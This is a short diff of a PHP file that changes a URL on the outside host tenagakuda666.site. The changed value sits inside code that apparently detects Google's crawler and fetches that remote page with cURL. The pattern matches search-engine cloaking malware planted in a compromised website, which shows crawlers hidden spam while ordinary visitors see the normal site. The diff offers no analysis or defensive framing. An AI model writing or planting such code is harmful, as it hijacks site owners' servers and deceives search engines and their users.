@@ -8,7 +8,7 @@ function google() {
 }
 
 if (google()) {
-    $bot_content = 'https://tenagakuda666.site/lavanderiaignacia/';
+    $bot_content = 'https://tenagakuda666.site/schechter-gallery/';
     
     $curl = curl_init();
 
